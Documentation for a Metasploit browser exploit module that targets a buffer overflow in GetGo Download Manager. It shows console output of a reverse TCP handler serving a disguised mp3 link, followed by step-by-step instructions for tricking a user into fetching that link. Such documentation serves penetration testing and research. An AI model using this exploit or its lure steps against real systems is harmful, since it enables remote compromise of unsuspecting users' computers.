## Description

This modules adds a buffer overflow exploit for GetGo Download Manager, which supports 
4.9.0.1982 and 5.3.0.2712. Versions prior should also be vulnerable.

This exploit has been tested on Windows XP SP3. The vulnerable software can be downloaded
at [GetGo Download Manager 5.3.0.2712](https://www.exploit-db.com/apps/b26d82eadef93531f8beafac6105ef13-GetGoDMSetup.exe)

To use this, first start the module like the following example:

```
msf5 exploit(windows/browser/getgodm_http_response_bof) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.0.12:4444 
msf5 exploit(windows/browser/getgodm_http_response_bof) > [*] Using URL: http://0.0.0.0:8080/shakeitoff.mp3
[*] Local IP: http://192.168.0.12:8080/shakeitoff.mp3
[*] Server started.
```

The exploit should give you a fake link. Pass this link to the Getgo user, and instruct them to
do the following:

1. Start GetGo Download Manager
2. Click on the DOWNLOAD button
3. Click on New (if the link is already copied to the clipboard, clicking on this should trigger
   the download, and get exploited).
4. If the link isn't in the clipboard, instruct the user to enter the URL in the URL field, and
   click OK. The user should also get exploited this way.
